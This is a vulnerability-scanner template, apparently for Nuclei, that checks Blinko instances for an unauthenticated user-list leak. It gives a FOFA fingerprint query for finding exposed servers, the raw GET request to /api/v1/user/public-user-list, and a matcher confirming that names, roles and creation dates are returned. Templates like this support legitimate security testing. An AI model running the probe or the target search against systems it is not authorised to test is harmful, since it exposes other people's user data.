id: Blinko-api-v1-user-public-user-list-Information-Disclosure

info:
  name: Blinko /api/v1/user/public-user-list 敏感信息泄露
  author: HuanXiong
  severity: medium
  description: |-
    fofa: icon_hash="-1446811182" || icon_hash="-717082057"
    Blinko 系统 /api/v1/user/public-user-list 接口存在敏感信息泄露漏洞，攻击者无需身份验证即可访问该接口，获取系统中所有用户的详细信息，包括用户名、角色、创建时间等。
  reference:
    - 
  tags: information-disclosure, blinko

http:
  - raw:
      - |-
        GET /api/v1/user/public-user-list HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36

    matchers:
      - type: dsl
        name: 敏感信息泄露
        dsl:
          - "status_code == 200 && contains_all(body, 'name', 'role', 'createdAt')"